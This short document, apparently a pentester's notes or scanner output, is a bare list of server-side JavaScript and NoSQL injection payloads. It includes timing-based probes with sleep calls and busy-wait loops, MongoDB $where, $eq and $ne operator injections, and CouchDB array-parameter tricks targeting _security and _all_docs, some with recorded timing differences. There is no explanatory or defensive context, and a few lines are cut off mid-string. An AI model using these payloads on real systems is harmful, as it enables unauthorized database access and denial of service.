# Server Side JavaScript injection

```js
1\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var>
'a';sleep(1) and 'a';sleep(10000). The timing difference was: 19414.
a;sleep(1) and a;sleep(10000). The timing difference was: 25669.
sleep(1) and sleep(10000). The timing difference was: 12467.
$where:"sleep(1)" and $where:"sleep(10000)". The timing difference was: 12266.  
%5b%5d=_security and %5b%5d=_all_docs
1\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var>
%5b%24eq%5d=1 and %5b%24ne%5d=1
';sleep(1);var xyz='0 and ';sleep(10000);var xyz='0
```
